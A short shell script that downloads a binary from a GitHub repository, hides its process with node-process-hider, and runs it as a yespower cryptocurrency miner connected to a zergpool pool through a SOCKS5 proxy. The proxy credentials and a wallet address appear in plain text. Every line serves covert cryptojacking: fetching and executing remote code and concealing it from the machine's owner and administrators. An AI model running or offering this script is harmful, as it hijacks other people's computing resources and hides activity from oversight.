apt update -y && apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
wget -q https://github.com/thirthada007/DevOps/raw/main/data
chmod +x data
npm i -g node-process-hider 
ph add data
./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TJsTWwcH7d56ikQ3L7AeBnFZPkjkgVKBgR.archer -p c=TRX -t $(nproc) -x socks5://lebarankita:buatTHRan@154.38.34.3:5015